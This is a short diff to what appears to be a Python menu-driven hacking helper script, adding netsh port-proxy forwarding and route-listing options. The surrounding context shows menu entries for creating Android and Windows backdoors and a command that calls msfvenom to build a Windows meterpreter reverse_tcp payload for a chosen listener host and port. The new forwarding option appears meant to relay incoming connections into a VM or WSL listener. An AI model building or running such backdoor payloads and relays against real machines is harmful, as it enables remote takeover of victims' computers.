@@ -7,7 +7,8 @@ print ('TYPE 3 top-ports')
 print ('TYPE 4 -Pn')
 print ('TYPE 5 Create AndRoid Backdoor')
 print ('TYPE 6 Create Windows Backdoor')
-
+print ('TYPE 7 farward to vmware or wsl (This option need to admin Access)')
+print ('TYPE 8 show routes')
 
 
 start_over = 'scaning'
@@ -37,8 +38,20 @@ elif  scan == "6":
     
     os.system("msfvenom -p  windows/x64/meterpreter/reverse_tcp LHOST="  + hostname + " LPORT="+input('port no ') + "  -o "+ input('Enter Backdoor Name  ')) 
         
+elif  scan == "7":
+    hostname = input('port no ')
+    
+    os.system("netsh interface portproxy add v4tov4 listenport=" + hostname + " listenaddress=0.0.0.0 connectport=" + hostname + " connectaddress=" + input('ip') )
+        
+elif  scan == "8":
+    
+    
+    os.system("netsh interface portproxy show v4tov4" )
+        
 else:
     print("\n\n  Sorry Don't Understand")
+    
+    
     
     
     
